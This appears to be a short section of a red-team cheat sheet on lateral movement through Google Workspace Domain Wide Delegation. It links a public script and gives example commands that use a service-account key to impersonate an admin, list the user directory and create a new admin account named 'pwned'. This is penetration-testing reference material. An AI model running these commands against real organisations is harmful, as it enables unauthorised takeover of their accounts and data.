## Lateral movement
### Domain Wide Delegation
Domain Wide Delegation allow some service account to access Google Workspace data such as Gmail, Drive and others. Initially design to allows apps to access users' data across your organization's Google Workspace environment.  

- https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_misc/-/blob/master/gcp_delegation.py?ref_type=heads

```
./gcp_delegation.py --keyfile ./credentials.json --impersonate steve.admin@target-org.com --domain target-org.com --list
```

You can also use this Python script to validate access, list user directory and create new administrative account
```
# Validate access only
$ ./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com

# List the directory
$ ./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --list

# Create a new admin account
$ ./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --account pwned
```
